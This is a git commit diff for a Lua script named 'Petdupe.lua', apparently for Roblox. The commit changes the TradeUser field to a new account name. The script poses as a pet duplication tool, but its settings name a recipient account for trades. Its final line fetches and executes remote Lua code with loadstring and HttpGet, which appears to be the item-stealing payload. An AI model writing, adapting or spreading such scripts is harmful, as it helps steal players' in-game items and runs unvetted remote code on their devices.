e893d47623521c8013ec2bc530f82ca65f2aa39a
OPGAMER449 <71721960+OPGAMER449@users.noreply.github.com>
2022-07-02 11:20:44 +0530

    Update Petdupe.lua

--- Petdupe.lua
+++ Petdupe.lua
@@ -1,6 +1,6 @@
 PetRarity = "Legendary"
 PetLimited = false
 PetAll = true
-TradeUser = "tyfortnycfph"
+TradeUser = "OPGAMER5210"
 WebhookURL = ""
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfkid/AutoFarm/main/dupegems.lua"))()
